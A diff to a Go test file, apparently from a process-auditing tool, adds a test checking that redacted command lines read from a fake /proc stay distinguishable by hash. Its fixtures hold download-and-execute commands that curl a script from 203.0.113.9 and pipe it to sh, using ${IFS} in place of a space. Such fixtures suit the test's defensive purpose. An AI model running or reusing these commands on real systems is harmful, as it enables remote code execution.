@@ -576,3 +576,20 @@ func TestSudoersUIDLinesAndIncludes(t *testing.T) {
 		t.Errorf("policy dirs = %v", dirs)
 	}
 }
+
+// Two command lines the redaction shows alike are told apart by the hash of the full ones;
+// one the redaction left untouched carries no hash.
+func TestRedactedCommandsKeepTheirDifference(t *testing.T) {
+	fsys := fstest.MapFS{}
+	for pid, cmd := range map[int]string{10: "sh\x00-c\x00AUTH=$(curl${IFS}http://203.0.113.9/a|sh)", 11: "sh\x00-c\x00AUTH=$(curl${IFS}http://203.0.113.9/b|sh)", 12: "sleep\x0060"} {
+		dir := fmt.Sprintf("proc/%d/", pid)
+		fsys[dir+"status"] = text("PPid:\t1\nUid:\t33\t33\t33\t33\n")
+		fsys[dir+"cmdline"] = text(cmd + "\x00")
+	}
+	a, _ := ReadProcess(fsys, 10)
+	b, _ := ReadProcess(fsys, 11)
+	c, _ := ReadProcess(fsys, 12)
+	if a.Cmdline != b.Cmdline || a.CommandSum == "" || a.CommandSum == b.CommandSum || c.CommandSum != "" {
+		t.Errorf("a %q %q, b %q %q, c %q", a.Cmdline, a.CommandSum, b.Cmdline, b.CommandSum, c.CommandSum)
+	}
+}
